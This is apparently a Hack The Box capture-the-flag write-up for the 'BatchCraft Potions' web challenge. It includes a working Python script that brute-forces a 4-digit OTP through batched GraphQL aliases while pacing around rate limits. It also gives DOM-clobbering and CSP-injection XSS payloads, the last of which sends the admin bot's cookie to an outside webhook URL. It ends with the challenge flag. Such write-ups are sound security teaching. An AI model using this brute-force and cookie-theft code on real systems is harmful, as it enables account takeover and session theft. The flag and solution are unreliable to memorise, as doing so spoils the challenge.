---
title: "BatchCraft Potions"
slug: "htb-batchcraft-potions"
platform: "Hack The Box"
difficulty: "Hard"
vulnerabilities: ["GraphQL","DOM Clobbering","Cross-Site Scripting"]
publishedAt: "2026-09-14"
summary: "Ghi lại quá trình phân tích xác thực hai bước và chức năng admin xem trước sản phẩm."
draft: false
sortOrder: 4
---
## Challenge Info
**Category:** Web 
**Difficulty:** Hard 
**Platform:** Hack The Box 
**Description:** An underground potions shop is selling cheating potions to one of the wizard houses for the annual contest. The group obtained a vendor’s login credentials, but the account has two-factor authentication, so the goal is to investigate who is behind the shop.
**Tags:** `#Web` `#GraphQl` `#bruteforce` `#dom-clobbering  `
## Overview
BatchCraft Potions is a basic web shop for potion products. User can login as vendor, pass 2FA, add new potion and wait admin bot to review the product. This app seem no especially at first, but it uses GraphQL for login/2FA and admin bot will visit user controlled product preview. Therefore, authentication flow and product content become attack surface. Notably, GraphQL endpoint doesn't strictly require verified:true before calling verify2FA; combined with 4 digits OTP, this bug become 2FA brute force via GraphQL batching. After that, product description and meta fields can be abused with DOM clobbering and CSP injection to trigger XSS on admin bot, steal admin JWT cookie and get flag.
## Source code analysis
```text=
web_batchcraft_potions/
├── challenge/
│   ├── index.js
│   ├── database.js
│   ├── bot.js
│   ├── helpers/
│   │   ├── GraphqlHelper.js
│   │   ├── JWTHelper.js
│   │   ├── OTPHelper.js
│   │   └── FilterHelper.js
│   ├── middleware/
│   │   └── AuthMiddleware.js
│   ├── routes/
│   │   └── index.js
│   ├── static/js/
│   │   ├── global.js
│   │   ├── login.js
│   │   ├── 2fa.js
│   │   ├── dashboard.js
│   │   └── product.js
│   └── views/
│       ├── login.html
│       ├── 2fa.html
│       ├── dashboard.html
│       └── product.html
├── config/
│   └── nginx.conf
├── Dockerfile
└── entrypoint.sh
```
1. **database.js**
![image](https://hackmd.io/_uploads/HJEFVs4Rbx.png)

=> We can login with `vendor53/PotionsFTW!` but still need OTP.
2. **GraphqlHelper.js**
![image](https://hackmd.io/_uploads/HyB51RVA-l.png)
![image](https://hackmd.io/_uploads/B1iP4kB0Zx.png)

=> Password login only gives JWT with verified=false. App has GraphQL mutation `Verify2FA` to verify OTP.
3. **OTPHelper.js**
![image](https://hackmd.io/_uploads/ryw4xRNRZx.png)

=> `genSecret` i mentioned before to generate OTP and only has 4 digits. So it only have **10000 possibilities** it seem can be bruteforced?!
4. **AuthMiddleware.js**
![image](https://hackmd.io/_uploads/H1lhYyB0Wl.png)

=> The app needs to allow the verify2FA mutation before the user is fully verified. It's too wide instead of only accepting mutation `verify2FA`(hmm it also not bad becuase this app has only 2 mutation)
5. **routes/index.js**
![image](https://hackmd.io/_uploads/BJrJ2ySRWx.png)

=> After 2FA, vendor can add product.
Every product is automatically reviewed by admin bot.
6. **bot.js**
![image](https://hackmd.io/_uploads/SygqRJrAbe.png)

=> Bot create JWT admin has `verified=true` and have flag, set it to cookie session and bot go to `/products/preview/:id`
7. **product.html**
![image](https://hackmd.io/_uploads/Bkzb1hBAbe.png)

=> It's render HTML meta in `<head>` and description product in `<body>`. if it hasn't good filter, it will become XSS
8. **FilterHelper.js**
![image](https://hackmd.io/_uploads/B1tPw3BAbx.png)

=> This file sanitizes HTML using DOMPurify, allows certain HTML/meta tags, and then creates CSP meta tags; however, CSP is weak because it allows `'unsafe-inline'.`
9. **global.js**
![image](https://hackmd.io/_uploads/HkEFRnSR-g.png)

Create global variable safe and hardcode, `potionTypes` will be whilte list and it will be use in file below
10. **product.js**
![image](https://hackmd.io/_uploads/BJnTJTrRWl.png)

=> `preend()` with string will be Jquery understand as HTML not text. so if we can control `potionTypes[i].src` it will become HTML dangerous.
## Exploitation chain and flag
### The Approach
So as I mentioned before, `product.js` belive in `potionTypes` and inject `potionTypes` into DOM by HTML.If `global.js` run, it will replace `potionTypes` by white list. But how if we can make `glocal.js` not run?! We will make `potionTypes` to point to unsafe data that will become to DOM XSS. So we need find a way to CSP injection to block `global.js` from `meta` in **product.html**. From this, `protionTypes` is our data and **product.js** will create HTML string and have real event handler. From that, XSS will in bot browser and we can sent cookie have flag to our web.
And how to add product, we need to bruteforce OTP.
```text=
|-- 1. Login with seeded vendor account
|     |
|     |-- username: vendor53
|     |-- password: PotionsFTW!
|     |
|     `-- Server returns JWT:
|         { username: "vendor53", verified: false }
|
|-- 2. Abuse GraphQL 2FA flow
|     |
|     |-- AuthMiddleware allows /graphql before checking verified=true
|     |-- verify2FA is a GraphQL mutation
|     |-- OTP is only 4 digits
|     |
|     `-- Use GraphQL aliases to brute-force many OTPs/request:
|         a0000: verify2FA(otp:"0000") { token }
|         a0001: verify2FA(otp:"0001") { token }
|         ...
|
|-- 3. Get verified vendor session
|     |
|     `-- Correct OTP returns new JWT:
|         { username: "vendor53", verified: true }
|
|-- 4. Add malicious product
|     |
|     |-- product_desc goes through DOMPurify
|     |-- meta fields are later rendered into <head>
|     |
|     `-- Backend stores product and triggers admin bot preview
|
|-- 5. Prepare DOM clobbering + CSP injection
|     |
|     |-- product_desc creates attacker-controlled window.potionTypes
|     |     <a id="potionTypes"></a>
|     |     <img id="1" name="potionTypes" src="...">
|     |
|     |-- product_og_desc injects CSP meta
|     |     allow jquery.min.js + product.js
|     |     block global.js
|     |
|     `-- global.js cannot overwrite window.potionTypes
|
|-- 6. Trigger DOM XSS in product.js
|     |
|     |-- product.js reads clobbered potionTypes[i].src
|     |-- inserts it into HTML string:
|     |     <img src='${potionTypes[i].src}'>
|     |
|     `-- src payload breaks attribute context and creates onerror
|
`-- 7. Steal admin cookie and decode flag
      |
      |-- bot admin cookie contains JWT with flag
      |-- XSS sends document.cookie to webhook
      |
      `-- Decode JWT payload:
          { username: "admin", verified: true, flag: "..." }
```
### Exploitation

**nginx.conf**
![image](https://hackmd.io/_uploads/HyrTtZLRbx.png)

`rate=20r/m` so we can send request each 3 second to prevent from `429` error. So if we try sequentially 10000 request we can't find OTP.
We need a better way and luckily Graph has a special config.
![image](https://hackmd.io/_uploads/Skg02ZLC-e.png)
link: https://graphql.org/learn/mutations/
Combining the technique above with GraphQL `aliases`, we can call verify2FA many times in a single request. We test small test like this:
![image](https://hackmd.io/_uploads/S1jFgG80bx.png)

From this we can have auto script bruteforce below to have OTP:

```python=
import time
import requests

BASE = "http://154.57.164.80:31958/"
BROWSER_SESSION = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InZlbmRvcjUzIiwidmVyaWZpZWQiOmZhbHNlLCJpYXQiOjE3Nzc3MzcxMTR9.QlV1voefkeuUMq8GevHAbH6_MXRASjiiIYTHHcHd010"

BATCH_SIZE = 1000
SLEEP_BETWEEN_BATCHES = 3.2


def session_value():
    value = BROWSER_SESSION.strip()
    if value.lower().startswith("session="):
        value = value.split("=", 1)[1]
    return value


def make_query(start, end):
    fields = []
    for i in range(start, end):
        otp = f"{i:04d}"
        fields.append(f'a{otp}:verify2FA(otp:"{otp}"){{message token}}')
    return "mutation{" + "".join(fields) + "}"


def try_batch(start, end):
    r = requests.post(
        BASE + "/graphql",
        headers={
            "Content-Type": "application/json",
            "Cookie": f"session={session_value()}",
        },
        json={"query": make_query(start, end)},
    )

    print(f"tried {start:04d}-{end - 1:04d}, status={r.status_code}")

    if r.status_code == 429:
        print("[!] rate limited, sleep 65s, then retry same batch")
        time.sleep(65)
        return None, False

    if r.status_code != 200:
        print(r.text[:500])
        return None, True

    body = r.json()
    errors = body.get("errors") or []
    non_otp_errors = [
        e.get("message", "")
        for e in errors
        if "Invalid OTP supplied" not in e.get("message", "")
    ]

    if non_otp_errors:
        print("[!] GraphQL error:", non_otp_errors[0])
        print("[!] Your browser session cookie is probably invalid/expired.")
        return "STOP", True

    data = body.get("data") or {}
    for alias, value in data.items():
        if value and value.get("token"):
            return (alias[1:], value["token"]), True

    return None, True


def main():
    if BROWSER_SESSION == "PASTE_BROWSER_SESSION_HERE":
        print("[!] Paste your browser session cookie into BROWSER_SESSION first.")
        return
    while True:
        start = 0
        while start < 10000:
            end = min(start + BATCH_SIZE, 10000)
            result, processed = try_batch(start, end)

            if result == "STOP":
                return
            if result:
                otp, token = result
                print()
                print("[+] FOUND OTP:", otp)
                print("[+] Enter this OTP in the browser /2fa page immediately.")
                print("[+] If the OTP already expired, set browser cookie session to this token:")
                print(token)
                return
            if processed:
                start = end
                time.sleep(SLEEP_BETWEEN_BATCHES)
        print("[i] Full 0000-9999 pass finished without a hit. Retrying because TOTP rotates.")


if __name__ == "__main__":
    main()
```

We can have right OTP and cookie session to `"verified":true`
![image](https://hackmd.io/_uploads/r1vlfzL0Wx.png)
![image](https://hackmd.io/_uploads/BkeIfMURZg.png)

We can go to `dashboard` to add product to have DOM XSS and bot review.Firstly, i test with CSP injection to prevent app from load `global.js`
![image](https://hackmd.io/_uploads/rJEyUzLA-e.png)
![image](https://hackmd.io/_uploads/B1vOUfUCbe.png)
We can see that `global.js` is block because of CSP. Now we can inject payload XSS write a `potionTypes`
```json=
{
  "product_name": "alert-test",
  "product_desc": "<a id=\"potionTypes\"></a><img id=\"1\" name=\"potionTypes\" src=\"cid:x\\' onerror='alert(1)'\">",
  "product_price": "123",
  "product_category": "1",
  "product_keywords": "avc",
  "product_og_title": "a",
  "product_og_desc": "script-src 'unsafe-inline' http://localhost:1337/static/js/jquery.min.js http://localhost:1337/static/js/product.js\" http-equiv=\"Content-Security-Policy"
}
```
![image](https://hackmd.io/_uploads/S1MdOf8C-l.png)
![image](https://hackmd.io/_uploads/ryteKfUCWe.png)

So browser resolve `window.potionTypes` from my DOM element.
Finally, we change payload to send cookie to webhook change origin to `127.0.0.1` instead of `localhost`
```json=
{
  "product_name": "a1",
  "product_desc": "<a id=\"potionTypes\"></a><img id=\"1\" name=\"potionTypes\" src=\"cid:x\\' onerror='fetch(`https://webhook.site/a7a20dd2-e7bf-4a6c-a7b3-677c83c906ce?c=`+encodeURIComponent(document.cookie),{mode:`no-cors`})'\">",
  "product_price": "123",
  "product_category": "1",
  "product_keywords": "avc",
  "product_og_title": "123",
  "product_og_desc": "script-src 'unsafe-inline' http://127.0.0.1/static/js/product.js http://127.0.0.1/static/js/jquery.min.js\" http-equiv=\"Content-Security-Policy"
}

```
and we will have flag in cookie
![image](https://hackmd.io/_uploads/ryaZqMLCZx.png)

**Flag: HTB{b4tch_my_p0710n5_w17h_s0m3_m3t4_m4g1c}**